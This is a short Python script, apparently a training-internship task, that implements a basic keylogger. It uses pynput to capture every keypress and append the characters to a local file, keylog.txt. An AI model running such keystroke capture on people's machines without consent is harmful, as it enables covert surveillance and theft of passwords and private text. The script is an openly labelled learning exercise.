#Prasunet task 4 keylogger

#importing the required library

from pynput import keyboard

# defining function which will be called when a key is pressed
def keypressed(key):
    print(str(key))
    # printing and writing the character to a file
    with open("keylog.txt",'a') as keylog:
        try:
            char=key.char
            keylog.write(char)
        except: # occurs when we use keys like control, alt etc
            print("error finding key")

# main program 
eventaction=keyboard.Listener(on_press=keypressed)
eventaction.start()
input()